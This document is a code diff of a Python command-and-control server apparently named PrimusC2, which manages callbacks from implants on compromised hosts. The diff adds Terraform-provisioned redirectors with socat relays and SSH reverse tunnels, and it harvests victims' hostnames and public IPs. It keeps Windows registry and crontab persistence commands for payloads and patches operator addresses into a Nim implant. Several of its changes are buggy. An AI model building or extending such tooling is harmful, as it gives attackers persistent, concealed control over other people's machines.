@@ -13,6 +13,11 @@ from http.server import HTTPServer, SimpleHTTPRequestHandler
 import http.server
 import base64
 import randomname
+from Cryptodome.PublicKey import RSA
+import re
+import atexit
+
+
 
 def banner():
     print('╔═╗┬─┐┬┌┬┐┬ ┬┌─┐  ╔═╗2')
@@ -40,6 +45,7 @@ def help():
     ------------------------------------------------------------------------------------------------------
     background                  --> Backgrounds current sessions
     exit                        --> Terminate current session
+    GetAV                       --> Get the current AV running
     ''')
 
 
@@ -48,7 +54,11 @@ def listener_handler(): # Function to handle incoming connections and send bytes
         sock.bind((host_ip, int(host_port)))
     except (OSError):
         print(f'[-] Adress already in use, please try another one')
-    print(f'[*] Awaiting callback from implants on {host_ip}:{host_port}')
+    if listen_choice == 3:
+        print(f'[*] Awaiting callback from implants on {re_ip_str}:{host_port} ')
+    else:
+        print(f'[*] Awaiting callback from implants on {host_ip}:{host_port}')
+    
     sock.listen()
     t1 = threading.Thread(target=comm_handler)
     t1.daemon = True
@@ -85,7 +95,8 @@ def target_comm(target_id, targets, num):
         if len(message) == 0:
             continue
         if message == 'help':
-            pass
+            help()
+            
         else:
             comm_out(target_id, message)
             if message == 'exit\n':
@@ -96,6 +107,7 @@ def target_comm(target_id, targets, num):
                 break
             if message == 'background\n':
                 break
+           
             if message == 'persist\n':
                 payload_n = input('[*] Enter the name of the payload to add to persist: ')
                 if targets[num] [6] == 1:
@@ -110,17 +122,10 @@ def target_comm(target_id, targets, num):
                     comm_out(target_id, persist2)
                     print(f'[*] Run the following command to cleanup the registry key: \nreg delete HKEY_CURRENT_USER\\Software\\Microsoft\\Windows\\CurrentVersion\\Run -v {ran_name} /f')
                     print('[+] The persistance technique has completed')
-            if message == 'execute-asm\n':
-                asm_name = input('[*] Enter the name of the .NET executable[<name>.byte]: ')
-                file_loc = os.path.expanduser(f'~/PrimusC2/C2/Payloads/{asm_name}')
-                if os.path.exists(file_loc):
-                    with open(file_loc, 'r') as file:
-                        data = file.read()
-                    
-                    comm_out(target_id, data)
-
-
-
+            
+            
+            if message == 'GetAV':
+                pass
                 if targets[num][6] == 2:
                     persist_command = f'echo "@hourly python3 /home/{targets[num][3]}/{payload_n}" | crontab -'
                     persist_command = base64.b64encode(persist_command.encode())
@@ -148,6 +153,10 @@ def comm_handler():
             admin = base64.b64decode(admin).decode()
             operating_system = remote_target.recv(4096).decode()
             operating_system = base64.b64decode(operating_system).decode()
+            host_name = remote_target.recv(4096).decode()
+            host_name = base64.b64decode(host_name).decode()
+            public_ip = remote_target.recv(4096).decode()
+            public_ip = base64.b64decode(public_ip).decode()
             if admin == 1:
                 admin_value = 'Yes'
             elif username == 'root':
@@ -161,10 +170,10 @@ def comm_handler():
             cur_time = time.strftime("%H:%M:%S",time.localtime())
             date = datetime.now()
             time_record = (f'{date.day}/{date.month}/{date.year} {cur_time}')
-            host_name = socket.gethostbyaddr(remote_ip[0])
+            
             if host_name is not None:
-                targets.append([remote_target, f"{host_name[0]}@{remote_ip[0]}", time_record, username, admin_value, operating_system, pay_val,'Active']) #Appending info to targets list
-                print(f'[+] Callback recieved from {host_name[0]}@{remote_ip[0]}\n' + 'Enter command#> ', end="")
+                targets.append([remote_target, f"{host_name}@{public_ip}", time_record, username, admin_value, operating_system, pay_val,'Active']) #Appending info to targets list
+                print(f'[+] Callback recieved from {host_name}@{public_ip}\n' + 'Enter command#> ', end="")
             else: 
                 targets.append([remote_target, remote_ip[0], time_record, username, admin_value, operating_system, 'Active'])
                 print(f'[+] Callback recieved from {remote_ip[0]}\n' + 'Enter command#> ', end="")  
@@ -236,8 +245,16 @@ def nimplant():
         shutil.move(f_name, implant_loc)
     else:
         print(f'[-] implant.nim not found in {file_loc}')
+    print('[*] Use listener address or specify other IP for implant to connect to: ')
+    print('[*] 1. Listener adress')
+    print('[*] 2. Other IP')
+    imp_choice = input('[*] Enter 1 or 2: ')
+    if imp_choice == 1:
+        pass
+    else:
+        host_ip = input('[*] Specify IP: ')
     with open(f'{implant_loc}/{f_name}') as f:
-        patch_host = f.read().replace('INPUT_IP', str(host_ip))
+        patch_host = f.read().replace('INPUT_IP', str(host_ip.strip()))
     with open(f'{implant_loc}/{f_name}', 'w') as f:
         f.write(patch_host)
         f.close()
@@ -305,9 +322,66 @@ def web_payload_server():
     thread.daemon = True
     thread.start()
     
-       
+
+def redirector(LPORT):
+    key_loc = os.path.expanduser('~/.ssh/id_rsa')
+    if os.path.exists(key_loc):
+        print('[+] Keypair already present...')
+    else:
+        print('[*] Generating SSH keypair...')
+        key = RSA.generate(2048)
+        public_key = key.publickey().export_key("PEM")
+        private_key = key.exportKey("PEM")
+        shutil.move(public_key, key_loc)
+        shutil.move(private_key, key_loc)
+
+    
+    terra_loc = os.path.expanduser('~/PrimusC2/Terraform')
+    redir_loc = os.path.expanduser('~/PrimusC2/Templates/redirector_template.tf')
+    copy_loc = os.path.expanduser('~/PrimusC2/Terraform/redirector.tf')
+    redirector_name = "redirector.tf"
+    if os.path.exists(redir_loc):
+        shutil.copy(redir_loc, copy_loc)
+        print('[*] Patching listening port...')
+        with open(f'{terra_loc}/{redirector_name}') as f:
+            patch_host = f.read().replace('LPORT', str(LPORT))
+        with open(f'{terra_loc}/{redirector_name}', 'w') as f:
+            f.write(patch_host)
+            f.close()
+            print('[+] Listening port patched\n')
+    
+    print('[*] Provisioning and configuring redirector... This will take a couple minutes')
+    os.chdir(terra_loc)
+    os.system("terraform init")
+    terra_cmd = ["terraform", "apply", "-auto-approve"]
+    process = subprocess.Popen(terra_cmd, stdout=subprocess.PIPE)
+    output = process.stdout.read()
+    redir_ip = re.findall(r'\b0mdroplet_ip_address \= \"(\d+\.\d+\.\d+.\d+)', output.decode('utf-8'))
+    global re_ip_str
+    re_ip_str = "".join(redir_ip)
+    process.wait()
+
+
+    print('[*] Running socat realy trough SSH.. wait a moment.')
+    subprocess.run(["ssh", f"root@{re_ip_str}", "/tmp/script.sh"],
+        shell=False,
+        stdout=subprocess.PIPE,
+        stderr=subprocess.PIPE,
+        check=False)
+    print('[+] Socat relay configured...')
+    print('[* Setting up reverse port forward on localhost]')
+    os.system(f"ssh -N -R 4567:localhost:{host_port} root@{re_ip_str} &")
 
    
+def exit_handler():
+    print('[*] Destroying redirector infrastructure...')
+    terra_loc = os.path.expanduser('~/PrimusC2/Terraform')
+    os.chdir(terra_loc)
+    os.system("terraform destroy -auto-approve")
+
+    print('[*] Cleaning up files....')
+    os.remove("redirector.tf")
+
 if __name__ == '__main__':
     targets = [] #store each socket connection
     listener_count = 0
@@ -329,14 +403,37 @@ if __name__ == '__main__':
             if command == 'help':
                 help()
             if command == 'listeners -g':
-                while True:
-                    try:
-                        host_ip = resolve_ip(input('[*] Enter the interface to listen on: '))
-                        
-                        host_port = int(input('[*] Enter listening port: '))
-                        break  # exit the loop if no exception was raised
-                    except (OSError, ValueError, TypeError):
-                        print('[-] No such interface or port... Please try again')
+                print('[*] 1. Interface')
+                print('[*] 2. IP-Address')
+                print('[*] 3. Listener with redirector ')
+                listen_choice = (input('[*] Choose an option: '))
+                
+                if listen_choice == '1':
+                    while True:
+                        try:
+                            host_ip = resolve_ip(input('[*] Enter the interface to listen on: '))
+                            
+                            host_port = int(input('[*] Enter listening port: '))
+                            break  # exit the loop if no exception was raised
+                        except (OSError, ValueError, TypeError):
+                            print('[-] No such Interface or port... Please try again')
+                elif listen_choice == 2:
+                    while True:
+                        try:
+                            host_ip = input('[*] Enter the IP to listen on: ')
+                                
+                            host_port = int(input('[*] Enter listening port: '))
+                            break  # exit the loop if no exception was raised
+                        except (OSError, ValueError, TypeError):
+                            print('[-] No such IP or port... Please try again')
+                elif listen_choice == '3':
+
+                    
+                    host_ip = resolve_ip("lo")
+                    
+                    host_port = int(input('[*] Enter listening port: '))
+                    redirector(host_port)
+                
                 listener_handler()
                 listener_count +=1
                 web_payload_server()
@@ -440,4 +537,4 @@ if __name__ == '__main__':
                 break
             else:
                 continue
-            
+atexit.register(exit_handler)
